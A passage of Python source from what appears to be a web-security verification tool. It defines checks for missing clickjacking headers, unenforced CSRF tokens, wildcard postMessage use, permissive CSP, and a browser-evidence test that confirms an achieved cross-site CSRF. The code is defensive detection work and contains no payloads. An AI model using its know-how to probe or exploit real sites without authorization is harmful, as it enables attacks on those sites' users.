                                          "dormancy_threshold_days": thresh})

    return _identity_signal(False, evidence=f"unrecognised/lead-only identity rule {rule!r} (stays a lead)",
                            observed={"rule": rule})


# ---------------------------------------------------------------------------
# Client-side POSTURE-WEAKNESS oracles (W16-STD-5) — clickjacking / CSRF / postMessage.
#
# The always-applicable constitution "Client-side" classes (constitution §V: XSS, CSRF, clickjacking,
# postMessage). Each proves a MISSING or WEAK client-side DEFENSE — a POSTURE WEAKNESS — from a RETAINED
# artifact ALONE (a response's headers, a control-vs-treatment response pair, or a handler's source),
# offline, ZERO traffic. They are DELIBERATELY NOT achieved-state exploit oracles: a single-response
# "the page WAS framed" / "the forged request went through" signal cannot be made near-zero-FP
# (legitimate framing / intentional embedding / SameSite-protected endpoints), so VIGIL refuses the
# achieved-state clickjacking oracle and proves the WEAKNESS (the absent/weak defense) instead — the
# sound claim (docs/DELIBERATE-REFUSALS.md refusal 8). Pure + deterministic; never raise.
# ---------------------------------------------------------------------------


def _clickjacking_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.CLICKJACKING_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


def _normalize_headers(raw: Any) -> "dict[str, str] | None":
    """A retained response's headers as a lowercase-keyed dict of joined values, or ``None`` if the shape
    is not a recognisable header collection. Accepts a Mapping ``{name: value}`` or a sequence of
    ``[name, value]`` pairs — the two JSON-safe shapes a captured response retains. Duplicate header names
    are joined with ``', '`` (RFC 7230 §3.2.2 field-combining). The consumers below read the COMBINED
    value TOKEN-AWARE — ``_xfo_declares_framing`` splits it on ``,`` and ``_CSP_FRAME_ANCESTORS_RE``
    treats ``,`` as a policy separator — so a doubled/comma-combined ``X-Frame-Options`` (proxy+app) and
    two ``Content-Security-Policy`` headers (one carrying ``frame-ancestors``) are correctly read as
    PROTECTED, never mis-read as unprotected."""
    if isinstance(raw, Mapping):
        items: list[tuple[Any, Any]] = list(raw.items())
    elif isinstance(raw, Sequence) and not isinstance(raw, (str, bytes)):
        items = []
        for pair in raw:
            if (isinstance(pair, Sequence) and not isinstance(pair, (str, bytes))
                    and len(pair) == 2):
                items.append((pair[0], pair[1]))
            else:
                return None
    else:
        return None
    out: dict[str, str] = {}
    for name, value in items:
        key = _coerce_text(name).strip().lower()
        if not key:
            continue
        val = _coerce_text(value).strip()
        out[key] = f"{out[key]}, {val}" if key in out else val
    return out


# a CSP `frame-ancestors` directive (any value) — a declared framing policy the browser enforces. It may
# sit at the policy start (`^`), after a directive separator (`;`), OR — when TWO CSP headers are
# RFC-7230-combined into one value — after a policy separator (`,`). Missing the `,` case would MISS a
# split CSP (a real defense) and mint a FALSE "unprotected" fact, so `,` is a valid preceding boundary.
_CSP_FRAME_ANCESTORS_RE = re.compile(r"(?i)(?:^|[;,])\s*frame-ancestors\b")
# ONE X-Frame-Options TOKEN that declares a framing policy: DENY / SAMEORIGIN (enforced), or the
# deprecated ALLOW-FROM (a declared intent — treated as "present" so a partner allowlist is NOT a FP).
_XFO_TOKEN_RE = re.compile(r"(?i)^(?:deny|sameorigin|allow-from\b.*)$")


def _xfo_declares_framing(value: str) -> bool:
    """True iff ANY comma-separated ``X-Frame-Options`` TOKEN declares a framing policy. Because duplicate
    XFO headers are field-combined into one value (RFC 7230 §3.2.2), a doubled/comma-combined header
    (``SAMEORIGIN, SAMEORIGIN`` from a proxy + app, ``DENY, DENY``) carries MULTIPLE tokens — and a browser
    enforces framing when ANY of them is DENY/SAMEORIGIN. So we split on ``,`` and test each token, rather
    than anchor-matching the whole combined value (which would MISS the multi-token case and mint a FALSE
    "unprotected" fact — the exact multi-header-XFO false positive that got the achieved-state oracle
    reverted, see docs/DELIBERATE-REFUSALS.md refusal 8). XFO's own values never contain a legitimate comma
    (ALLOW-FROM takes a single origin), so splitting on ``,`` is sound."""
    return any(_XFO_TOKEN_RE.match(tok.strip()) for tok in value.split(","))


def clickjacking_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a RETAINED response provably ships NO framing protection — a pure header check over the
    OBSERVED headers, exactly the two defenses a browser enforces. One rule, ``framing_unprotected``:

      * fires (0.9) ONLY when the response carries NEITHER a framing ``X-Frame-Options`` (DENY /
        SAMEORIGIN / the deprecated ALLOW-FROM) NOR a CSP ``frame-ancestors`` directive — both framing
        defenses are absent, so ANY origin can frame the page and mount a UI-redress (clickjacking) attack.

    A response that declares EITHER defense does NOT fire — a present ``frame-ancestors`` directive (even a
    permissive one) is a deliberate framing policy, and firing on it would be exactly the FP a permissive
    value invites (that stays a LEAD, never an oracle FACT). Two further near-zero-FP gates: (1) the
    response must be a FRAMABLE DOCUMENT — its ``Content-Type`` declares ``text/html`` (or
    ``application/xhtml+xml``); a JSON/image/API response cannot be meaningfully clickjacked, so a missing
    or non-document content-type REFUSES. (2) Absence must be OBSERVED: the control MUST carry a
    ``headers`` collection (a captured response's complete header set); an unretained header set REFUSES.
    DELIBERATELY NOT an achieved-state oracle — a "the page WAS framed" signal cannot be near-zero-FP
    (legitimate framing exists). Never raises."""
    if not isinstance(observed_control, Mapping):
        return _clickjacking_signal(False, evidence="no clickjacking control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower() or "framing_unprotected"
    if rule != "framing_unprotected":
        return _clickjacking_signal(
            False, observed={"rule": rule},
            evidence=f"unrecognised/lead-only clickjacking rule {rule!r} (stays a lead)")
    url = _coerce_text(observed_control.get("url")).strip()
    where = f" for {url}" if url else ""
    headers = _normalize_headers(observed_control.get("headers"))
    if headers is None:
        return _clickjacking_signal(
            False, observed={"rule": rule},
            evidence=("no retained response headers to judge — framing posture UNOBSERVED "
                      "(REFUSE: absence must be observed, never assumed)"))
    ctype = headers.get("content-type", "").lower()
    if not ("text/html" in ctype or "application/xhtml+xml" in ctype):
        return _clickjacking_signal(
            False, observed={"rule": rule, "content_type": ctype or None},
            evidence=("the response is not a framable HTML document (Content-Type "
                      f"{ctype or 'absent'!r}) — clickjacking does not apply (REFUSE)"))
    xfo = headers.get("x-frame-options", "")
    csp = headers.get("content-security-policy", "")
    xfo_protects = _xfo_declares_framing(xfo)
    csp_protects = bool(_CSP_FRAME_ANCESTORS_RE.search(csp))
    if xfo_protects or csp_protects:
        which = ("X-Frame-Options=" + xfo) if xfo_protects else "CSP frame-ancestors"
        return _clickjacking_signal(
            False, observed={"rule": rule, "x_frame_options": xfo or None, "csp": csp or None},
            evidence=f"a framing defense is declared ({which}) — not unprotected")
    return _clickjacking_signal(
        True, conf=0.9,
        evidence=(f"the response{where} ships NO framing defense — neither an X-Frame-Options "
                  "(DENY/SAMEORIGIN) header nor a CSP frame-ancestors directive is present, so any "
                  "origin can frame it (clickjacking / UI-redress is unmitigated)"),
        observed={"rule": rule, "url": url or None, "x_frame_options": xfo or None, "csp": csp or None})


def _csrf_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.CSRF_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


_STATE_CHANGING_METHODS = frozenset({"post", "put", "patch", "delete"})


def _is_2xx(status: Any) -> bool:
    return isinstance(status, int) and not isinstance(status, bool) and 200 <= status < 300


def csrf_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire on a control-DIFFERENTIAL proving an anti-CSRF (synchronizer) token is NOT ENFORCED on a
    state-changing endpoint — a re-derivation over TWO retained responses, never a scanner's say-so. One
    rule, ``token_not_enforced``, fires (0.9) ONLY when ALL hold:

      * the method is state-changing (POST/PUT/PATCH/DELETE);
      * the CONTROL request (a valid anti-CSRF token present) was ACCEPTED — a retained 2xx
        ``token_present_status`` (the baseline works);
      * the TREATMENT request (the SAME request with the token REMOVED or FORGED) was ACCEPTED — a
        retained 2xx ``token_absent_status``.

    A valid-token request and a stripped/forged-token request BOTH accepted proves the token is not
    validated — no synchronizer-token CSRF defense (a posture weakness). If stripping/forging the token
    changes acceptance (a non-2xx reject / redirect / status divergence), the token IS enforced and it
    does NOT fire. A safe method (GET/HEAD), a control that did not itself succeed, or a missing/non-int
    status REFUSES. Proves ONLY that the token is not enforced — NEVER that a cross-site attack succeeded
    (SameSite cookies / Origin checks are a separate defense layer this does not adjudicate). Pure +
    deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _csrf_signal(False, evidence="no CSRF control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower() or "token_not_enforced"
    if rule != "token_not_enforced":
        return _csrf_signal(False, observed={"rule": rule},
                            evidence=f"unrecognised/lead-only CSRF rule {rule!r} (stays a lead)")
    method = _coerce_text(observed_control.get("method")).strip().lower()
    endpoint = _coerce_text(observed_control.get("endpoint")).strip()
    where = (f" {method.upper()} {endpoint}").rstrip() if (method or endpoint) else ""
    if method not in _STATE_CHANGING_METHODS:
        return _csrf_signal(False, observed={"rule": rule, "method": method or None},
                            evidence=(f"method {method!r} is not state-changing — anti-CSRF token enforcement "
                                      "is not applicable (REFUSE)"))
    present = observed_control.get("token_present_status")
    absent = observed_control.get("token_absent_status")
    if (not isinstance(present, int) or isinstance(present, bool)
            or not isinstance(absent, int) or isinstance(absent, bool)):
        return _csrf_signal(False, observed={"rule": rule},
                            evidence=("both the token-present and token-absent/forged response statuses must be "
                                      "retained integers — the control-differential is UNRESOLVED (REFUSE)"))
    if not _is_2xx(present):
        return _csrf_signal(False, observed={"rule": rule, "token_present_status": present},
                            evidence=(f"the valid-token control was not accepted (status {present}) — there is no "
                                      "working baseline to differentiate against (REFUSE)"))
    if not _is_2xx(absent):
        return _csrf_signal(False, observed={"rule": rule, "token_present_status": present,
                                             "token_absent_status": absent},
                            evidence=(f"removing/forging the anti-CSRF token changed acceptance (status {absent} vs "
                                      f"{present}) — the token IS enforced (protected)"))
    return _csrf_signal(True, conf=0.9,
                        evidence=(f"a state-changing request{where} was accepted with a valid anti-CSRF token "
                                  f"(status {present}) AND accepted with the token removed/forged (status {absent}) "
                                  "— the synchronizer token is NOT enforced (no token-based CSRF defense)"),
                        observed={"rule": rule, "method": method, "endpoint": endpoint or None,
                                  "token_present_status": present, "token_absent_status": absent})


def _csrf_achieved_signal(fired: bool, *, evidence: str, observed: dict,
                          conf: float = 0.9) -> OracleSignal:
    # kind is the FROZEN ACHIEVED_STATE (never a new OracleKind — _ALL_ORACLES stays 15); reachable ONLY
    # via the `csrf_achieved` BUG_CLASS_ORACLES row keyed on a fresh ctx key. `conclusive` is True ONLY on a
    # fire: a fire is a decisive, channel-confirmed achieved cross-site state change; a NON-fire is
    # UNINFORMATIVE here (no channel / a SameSite-protected cookie / an enforced token) — never a CLEAN, so
    # this branch is positive-only (clean_capable:false), unlike the predicate/achieved_state modes.
    return OracleSignal(kind=OracleKind.ACHIEVED_STATE, fired=fired,
                        confidence=(conf if fired else 0.0), conclusive=fired,
                        evidence=evidence, observed=observed)


# a marker VIGIL mints per probe must be long enough that it cannot incidentally pre-exist in an
# authoritative post-state readback (the runner uses a >=16-hex token; the oracle floors it at 8).
_CSRF_MARKER_MIN_LEN = 8

# Field / header names that indicate an ANTI-CSRF TOKEN (a synchronizer token, double-submit token,
# or custom guard header). If the OBSERVED cross-site write carried ANY of these, the request was NOT
# authorized by the ambient session cookie ALONE — it is not the ambient-cookie-only topology this class
# proves, so ambient_only is derived FALSE and the oracle REFUSES. Substring match on lowercased names;
# the set errs toward REFUSAL (a false negative / LEAD is safe; a false achieved-CSRF FACT is not).
_CSRF_TOKEN_INDICATORS = (
    "csrf", "xsrf", "authenticity_token", "csrfmiddlewaretoken", "requestverificationtoken",
    "antiforgery", "anti_forgery", "anti-forgery", "_token", "nonce", "verification_token",
)


def _csrf_origin_parts(origin: Any) -> "tuple[str, str] | None":
    """(scheme, host) of a web origin, lowercased, or None when it is not a parseable http(s) origin.
    The host is what the SameSite ``site`` boundary is derived from below."""
    text = _coerce_text(origin).strip()
    if not text:
        return None
    parts = urlsplit(text)
    scheme = (parts.scheme or "").lower()
    host = (parts.hostname or "").lower()
    if scheme not in ("http", "https") or not host:
        return None
    return scheme, host


def _csrf_registrable(host: str) -> str:
    """A conservative registrable-site key for ``host``. An IP literal is its own site (the whole IP);
    a single-label host (``localhost``) is itself; otherwise the last two labels (eTLD+1 heuristic — no
    PSL, deliberately coarse: it only ever makes the cross-site test STRICTER / more likely to refuse)."""
    h = (host or "").strip(".").lower()
    if not h:
        return ""
    # IPv4/IPv6 literal → the literal is the site (127.0.0.1 and localhost are DIFFERENT sites).
    try:
        ipaddress.ip_address(h)
        return h
    except ValueError:
        pass
    labels = h.split(".")
    if len(labels) <= 2:
        return h
    return ".".join(labels[-2:])


def _csrf_cross_site(initiator: Any, target: Any) -> bool:
    """Whether ``initiator`` and ``target`` are genuinely CROSS-SITE (schemeful-same-site is False):
    both parse as http(s) origins, and either the scheme differs or their registrable sites differ.
    A same-origin / same-site pair (or an unparseable origin) is NOT cross-site — so a same-origin
    OBSERVATION can never satisfy the topology this class proves."""
    a = _csrf_origin_parts(initiator)
    b = _csrf_origin_parts(target)
    if a is None or b is None:
        return False
    if a[1] == b[1]:                       # same host ⇒ same site (ports are NOT part of the site)
        return False
    if a[0] != b[0]:                       # schemeful same-site: a scheme mismatch is cross-site
        return True
    return _csrf_registrable(a[1]) != _csrf_registrable(b[1])


def _csrf_ambient_cookie_attached(observed_control: Mapping, cookie_name: str) -> bool:
    """Whether the SameSite-honoring browser ACTUALLY attached the ambient session cookie to the
    cross-site write — the load-bearing SameSite-dissolution evidence, re-derived from the CDP-observed
    ``associated_cookies`` (each ``{name, blocked_reasons}``) and corroborated by the observed ``Cookie``
    request header. True ONLY when an entry named ``cookie_name`` has an EMPTY ``blocked_reasons`` list
    (the browser sent it) AND that name appears in the observed Cookie header. A ``Lax``/``Strict`` cookie
    carries a ``SameSite*`` blocked reason (or is simply absent) ⇒ False ⇒ the oracle REFUSES."""
    name = (cookie_name or "").strip()
    if not name:
        return False
    assoc = observed_control.get("associated_cookies")
    if not isinstance(assoc, Sequence) or isinstance(assoc, (str, bytes)):
        return False
    attached = False
    for entry in assoc:
        if not isinstance(entry, Mapping):
            continue
        if _coerce_text(entry.get("name")).strip() != name:
            continue
        reasons = entry.get("blocked_reasons")
        blocked = bool(reasons) if isinstance(reasons, Sequence) and not isinstance(reasons, (str, bytes)) else bool(_coerce_text(reasons).strip())
        if not blocked:
            attached = True
    # Corroborate against the actual Cookie header the browser sent on the cross-site request.
    cookie_header = _coerce_text(observed_control.get("observed_cookie_header"))
    return attached and (f"{name}=" in cookie_header)


def _csrf_anti_token_present(observed_control: Mapping) -> bool:
    """Whether the OBSERVED cross-site write carried an anti-CSRF token in its body fields or request
    headers (⇒ NOT ambient-cookie-only). Re-derived from the retained observed field / header names."""
    names: list[str] = []
    for key in ("observed_request_fields", "observed_request_header_names"):
        seq = observed_control.get(key)
        if isinstance(seq, Sequence) and not isinstance(seq, (str, bytes)):
            names.extend(_coerce_text(n).strip().lower() for n in seq)
    return any(ind in n for n in names for ind in _CSRF_TOKEN_INDICATORS)


def csrf_achieved_oracle(observed_control: Any) -> OracleSignal:
    """Fire on browser-OBSERVED evidence proving an ACHIEVED cross-site state change — a re-derivation
    over evidence a real SameSite-honoring headless browser produced, NEVER a scanner's bare-bool say-so.
    ONE rule, ``cross_site_state_change``, fires (0.9) ONLY when ALL hold:

      * the method is state-changing (POST/PUT/PATCH/DELETE);
      * ``cross_origin`` is DERIVED, not attested: the retained ``initiator_origin`` (the browser-attested
        ``Origin`` of the page that issued the write) and ``target_origin`` are genuinely CROSS-SITE
        (:func:`_csrf_cross_site` — different registrable sites / schemeful-same-site is False). A
        same-origin observation can never satisfy this;
      * the ambient session cookie was ACTUALLY ATTACHED cross-site by the browser: the CDP-observed
        ``associated_cookies`` shows the ``ambient_cookie_name`` cookie with an EMPTY ``blocked_reasons``
        AND it appears in the observed ``Cookie`` header (:func:`_csrf_ambient_cookie_attached`). This is
        the SameSite-dissolution proof — a ``Lax``/``Strict`` cookie is NOT sent cross-site (it carries a
        ``SameSite*`` blocked reason), so this REFUSES against a SameSite-defended target;
      * ``ambient_only`` is DERIVED, not attested: the observed write carried NO anti-CSRF token in its
        body fields or request headers (:func:`_csrf_anti_token_present` is False) — the cookie is the
        sole credential;
      * a VIGIL-chosen UNIQUE per-probe ``marker`` (>= 8 chars, so it cannot pre-exist) appears in the
        AUTHORITATIVE post-state readback taken AFTER the ambient-cookie cross-site request
        (``with_cookie_state``);
      * that SAME marker is ABSENT from the readback of the NO-COOKIE control (``no_cookie_state``) — the
        identical cross-site request issued FIRST WITHOUT the ambient cookie, so a marker already present
        there attributes the change to something other than the cookie and REFUSES.

    A state change reached WITH the browser-attached ambient cookie but NOT without it, from a genuinely
    cross-site initiator, with no anti-CSRF token, proves the write was authorized SOLELY by the ambient
    session cookie riding cross-site — an achieved CSRF. This DISSOLVES the SameSite objection that got
    the naive version refused: against a target defended by ``SameSite=Strict``/``Lax`` ALONE the browser
    does NOT attach the cookie (``blocked_reasons`` carries ``SameSiteStrict``/``SameSiteLax`` and no state
    change is reached), so BOTH the attachment check AND the with-cookie readback fail → NO fire (correct).
    An enforced anti-CSRF token rejects the token-less write (no state change) AND, if VIGIL had supplied
    one, would trip the anti-token derivation → no fire. An endpoint that accepts the write with NO cookie
    (merely unauthenticated, not CSRF) leaves the marker in ``no_cookie_state`` → no fire. A urllib /
    same-origin / bare-bool context that lacks the browser-observed ``associated_cookies`` /
    ``initiator_origin`` evidence can NEVER fire — the oracle refuses to mint without it. Pure +
    deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _csrf_achieved_signal(False, evidence="no CSRF achieved-state evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower() or "cross_site_state_change"
    if rule != "cross_site_state_change":
        return _csrf_achieved_signal(
            False, observed={"rule": rule},
            evidence=f"unrecognised/lead-only CSRF-achieved rule {rule!r} (stays a lead)")
    method = _coerce_text(observed_control.get("method")).strip().lower()
    endpoint = _coerce_text(observed_control.get("endpoint")).strip()
    where = (f" {method.upper()} {endpoint}").rstrip() if (method or endpoint) else ""
    if method not in _STATE_CHANGING_METHODS:
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "method": method or None},
            evidence=(f"method {method!r} is not state-changing — an achieved CSRF is not applicable "
                      "(REFUSE)"))
    # DERIVE cross_origin from the OBSERVED origins (browser-attested Origin vs the target) — never a bool.
    initiator_origin = _coerce_text(observed_control.get("initiator_origin")).strip()
    target_origin = _coerce_text(observed_control.get("target_origin")).strip()
    if not _csrf_cross_site(initiator_origin, target_origin):
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "initiator_origin": initiator_origin or None,
                             "target_origin": target_origin or None},
            evidence=("the write's OBSERVED initiator origin is not genuinely CROSS-SITE from the target "
                      "(a same-origin / same-site / unparseable observation, or a bare-bool context with no "
                      "observed origins) — the cross-origin topology is UNPROVEN (REFUSE)"))
    # DERIVE the SameSite-dissolution fact from the CDP-observed associated cookies — never a bool. This
    # is what refuses a SameSite=Strict/Lax target: the browser did not attach the cookie cross-site.
    ambient_cookie_name = _coerce_text(observed_control.get("ambient_cookie_name")).strip()
    if not _csrf_ambient_cookie_attached(observed_control, ambient_cookie_name):
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "ambient_cookie_name": ambient_cookie_name or None,
                             "associated_cookies": observed_control.get("associated_cookies")},
            evidence=("the SameSite-honoring browser did NOT attach the ambient session cookie to the "
                      "cross-site write (no observed associated-cookie with empty blocked_reasons + a "
                      "matching Cookie header) — a SameSite=Strict/Lax cookie, or the absence of the "
                      "browser-observed cookie-attachment evidence, lands here (REFUSE)"))
    # DERIVE ambient_only from the OBSERVED request — an anti-CSRF token defeats the ambient-cookie-only
    # topology (and a bare-bool context with no observed request evidence stays safe: no fire above).
    if _csrf_anti_token_present(observed_control):
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "observed_request_fields": observed_control.get("observed_request_fields"),
                             "observed_request_header_names": observed_control.get("observed_request_header_names")},
            evidence=("the OBSERVED cross-site write carried an anti-CSRF token (body field or request "
                      "header) — the write was NOT authorized by the ambient cookie ALONE (REFUSE)"))
    marker = _coerce_text(observed_control.get("marker")).strip()
    if len(marker) < _CSRF_MARKER_MIN_LEN:
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "marker_len": len(marker)},
            evidence=(f"the per-probe marker must be a VIGIL-chosen token of >= {_CSRF_MARKER_MIN_LEN} "
                      "chars so it cannot pre-exist in the readback (REFUSE)"))
    with_cookie = _coerce_text(observed_control.get("with_cookie_state"))
    no_cookie = _coerce_text(observed_control.get("no_cookie_state"))
    in_with = marker in with_cookie
    in_no = marker in no_cookie
    if not in_with:
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "marker": marker, "in_with_cookie": in_with,
                             "in_no_cookie": in_no},
            evidence=(f"the marker does NOT appear in the authoritative post-state after the ambient-cookie "
                      f"cross-site request{where} — no cross-site state change was reached (a SameSite "
                      "cookie not sent cross-site, or an enforced token, would land here — correct non-fire)"))
    if in_no:
        return _csrf_achieved_signal(
            False, observed={"rule": rule, "marker": marker, "in_with_cookie": in_with,
                             "in_no_cookie": in_no},
            evidence=("the marker ALSO appears in the NO-COOKIE control's post-state — the state change is "
                      "NOT attributable to the ambient cookie (a merely-unauthenticated write, not CSRF) "
                      "(REFUSE)"))
    return _csrf_achieved_signal(
        True, conf=0.9,
        evidence=(f"a VIGIL-chosen unique marker reached the authoritative post-state after a cross-site "
                  f"state-changing request{where}: the browser ATTACHED the ambient session cookie cross-site "
                  "(observed, no SameSite block), carried NO anti-CSRF token, and the marker is ABSENT from "
                  "the no-cookie control — the write was authorized solely by the ambient cookie riding "
                  "cross-site (an achieved CSRF)"),
        observed={"rule": rule, "method": method, "endpoint": endpoint or None, "marker": marker,
                  "initiator_origin": initiator_origin, "target_origin": target_origin,
                  "ambient_cookie_name": ambient_cookie_name, "in_with_cookie": in_with,
                  "in_no_cookie": in_no})


def _postmessage_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.POSTMESSAGE_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


# a `postMessage(<data>, "*")` call whose SECOND argument (targetOrigin) is a literal `*`. Bounded
# alternation over a length-capped source (ReDoS-safe): the message argument may nest one level of
# parens; the targetOrigin literal must be exactly a quoted `*`.
_POSTMESSAGE_WILDCARD_RE = re.compile(
    r"""(?is)postMessage\s*\((?:[^()]|\([^()]*\))*,\s*(['"])\*\1\s*\)""")
# any reference to `origin` (event.origin / e.origin / a destructured origin / a guard helper) — the
# presence of an origin check. SOUND in the negative direction: if `origin` appears NOWHERE, there is
# provably no origin validation. Its presence (even in a string/comment) SUPPRESSES a fire (safe under-report).
_ORIGIN_REF_RE = re.compile(r"(?i)\borigin\b")
# the handler consumes the untrusted cross-origin payload (event.data / e.data / msg.data / .data).
_USES_MESSAGE_DATA_RE = re.compile(r"(?i)\.\s*data\b")


def postmessage_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a RETAINED postMessage handler source re-derives a wildcard cross-origin weakness — a
    sound STATIC check over the source ALONE, never a scanner's say-so. Two rules:

      * ``wildcard_target`` — a ``postMessage(<data>, "*")`` send whose targetOrigin literal is ``*`` (in
        the retained source), OR a retained ``target_origin`` field equal to ``*``. A ``*`` targetOrigin
        broadcasts the message to ANY origin (data exfiltration to a hostile frame). A send to a SPECIFIC
        origin does NOT fire.
      * ``no_origin_check`` — a ``message``-event handler that CONSUMES the untrusted payload
        (``event.data``) yet references ``origin`` NOWHERE in its source: there is provably no
        ``event.origin`` validation, so the handler acts on messages from ANY origin. A handler that
        references ``origin`` ANYWHERE (an origin check — even in a helper/guard) does NOT fire
        (near-zero-FP: a present ``origin`` reference safely SUPPRESSES).

    Proves the MISSING/WEAK origin restriction (a posture weakness), NEVER a proven cross-origin exploit.
    ReDoS-safe (length-capped source, bounded alternation). Pure + deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _postmessage_signal(False, evidence="no postMessage control evidence", observed={})
    source = _coerce_text(observed_control.get("handler_source") or observed_control.get("source"))[:20000]
    target_origin = _coerce_text(observed_control.get("target_origin")).strip()
    rule = _coerce_text(observed_control.get("rule")).strip().lower()
    if not rule:
        rule = ("wildcard_target" if (target_origin or "postmessage" in source.lower())
                else ("no_origin_check" if source else ""))

    if rule == "wildcard_target":
        if target_origin == "*":
            return _postmessage_signal(
                True, conf=0.9,
                evidence=("a postMessage send uses targetOrigin '*' (retained literal) — the message is "
                          "broadcast to ANY origin"),
                observed={"rule": rule, "target_origin": "*"})
        if source and _POSTMESSAGE_WILDCARD_RE.search(source):
            return _postmessage_signal(
                True, conf=0.9,
                evidence=("the handler source calls postMessage(<data>, '*') — a wildcard targetOrigin "
                          "broadcasts the message to ANY origin"),
                observed={"rule": rule, "wildcard_send": True})
        return _postmessage_signal(
            False, observed={"rule": rule, "target_origin": target_origin or None},
            evidence="no wildcard '*' targetOrigin in the retained send/source — a specific-origin send is not a weakness (no fire)")

    if rule == "no_origin_check":
        if not source:
            return _postmessage_signal(False, observed={"rule": rule},
                                       evidence="no retained handler source to judge (REFUSE)")
        if not _USES_MESSAGE_DATA_RE.search(source):
            return _postmessage_signal(
                False, observed={"rule": rule},
                evidence="the handler does not consume event.data — no untrusted cross-origin payload is acted on (no fire)")
        if _ORIGIN_REF_RE.search(source):
            return _postmessage_signal(
                False, observed={"rule": rule},
                evidence="the handler references `origin` — an origin check is present (protected; no fire)")
        return _postmessage_signal(
            True, conf=0.9,
            evidence=("a message-event handler consumes event.data yet references `origin` NOWHERE — it "
                      "validates no sender origin and acts on messages from ANY origin"),
            observed={"rule": rule, "uses_data": True, "checks_origin": False})

    return _postmessage_signal(False, observed={"rule": rule},
                               evidence=f"unrecognised/lead-only postMessage rule {rule!r} (stays a lead)")


# ---------------------------------------------------------------------------
# 3c. Content-Security-Policy — permissive-policy POSTURE + the achieved-bypass guard (Wave 2.4)
#
# Two sound CSP claims share the parser below:
#   * ``csp_posture_oracle`` (OracleKind.CSP_POSTURE) — a posture-FACT over the RETAINED enforced CSP
#     response HEADER: it fires on a real permissive weakness in the effective ``script-src`` that a
#     browser would honor. NO browser needed; offline-re-derivable.
#   * ``csp_purports_to_block`` — the guard the DOM_EXECUTION dispatch arm applies to the ``csp_bypass``
#     class: True iff the RETAINED enforced CSP's effective script-src is RESTRICTIVE (it purported to
#     block an arbitrary injected script), so a canary that nonetheless EXECUTED is a genuine BYPASS —
#     not plain DOM-XSS on a permissive/absent policy.
#
# Both parse the CSP the same way (first-occurrence-wins per directive, CSP spec), honor the browser
# rule that a nonce/hash NEUTRALIZES ``'unsafe-inline'``, and fall back script-src -> default-src for the
# effective script directive. Pure + deterministic (no wallclock/rng); ReDoS-safe (split-based parse over
# a length-capped header); never raise.
# ---------------------------------------------------------------------------

# a source token that NEUTRALIZES 'unsafe-inline' (a nonce or a hash) — per CSP3 the presence of a nonce
# or hash source causes the browser to IGNORE 'unsafe-inline', so 'unsafe-inline' beside a nonce/hash is
# NOT a weakness (VIGIL honors that rule, else it would false-flag a hardened nonce policy).
_CSP_NONCE_HASH_RE = re.compile(r"(?i)^'(?:nonce-|sha256-|sha384-|sha512-)")


def _parse_csp(header: Any) -> "dict[str, list[str]]":
    """Parse a CSP header value into ``{directive_lower: [source_tokens]}``. First occurrence of a
    directive wins (CSP spec); source tokens are kept verbatim (keyword comparisons lowercase a copy).
    Length-capped + split-based (ReDoS-safe). Never raises."""
    directives: dict[str, list[str]] = {}
    for part in _coerce_text(header)[:8000].split(";"):
        toks = part.split()
        if not toks:
            continue
        name = toks[0].lower()
        if name not in directives:
            directives[name] = toks[1:]
    return directives


def _effective_script_src(directives: "dict[str, list[str]]") -> "list[str] | None":
    """The effective script-source directive tokens a browser applies to ``<script>`` execution:
    ``script-src`` if present, else the ``default-src`` fallback, else ``None`` (no script restriction)."""
    if "script-src" in directives:
        return directives["script-src"]
    if "default-src" in directives:
        return directives["default-src"]
    return None


def _csp_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.CSP_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


def csp_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when the RETAINED enforced CSP header's effective ``script-src`` carries a real permissive
    weakness — a sound parse over the header ALONE, no browser, offline. One rule,
    ``permissive_script_src``, fires (0.9) when the effective script-src (``script-src`` else the
    ``default-src`` fallback) of the ENFORCED (non-report-only) policy contains ANY of:

      * ``'unsafe-inline'`` WITHOUT a neutralizing nonce-/hash- companion (a nonce/hash makes the browser
        IGNORE ``'unsafe-inline'`` — CSP3 — so ``'unsafe-inline'`` beside a nonce/hash is NOT flagged);
      * a wildcard ``*`` source (any host may serve script);
      * an ``http:`` or ``data:`` scheme source (any http origin / inline data URI may serve script);
      * ``'unsafe-eval'`` (``eval``/``Function`` are enabled).

    Proves the PARSED policy weakness (a posture-FACT), NEVER an achieved exploit — the achieved bypass is
    the strictly-stronger ``csp_bypass`` class (DOM_EXECUTION + the ``csp_purports_to_block`` guard). A
    well-formed policy (nonce-based, no permissive token), a REPORT-ONLY header (it enforces nothing, so a
    permissive report-only is not judged here), or a policy with no effective script-src do NOT fire
    (near-zero-FP). Pure + deterministic; ReDoS-safe; never raises."""
    if not isinstance(observed_control, Mapping):
        return _csp_signal(False, evidence="no CSP control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower() or "permissive_script_src"
    if rule != "permissive_script_src":
        return _csp_signal(False, observed={"rule": rule},
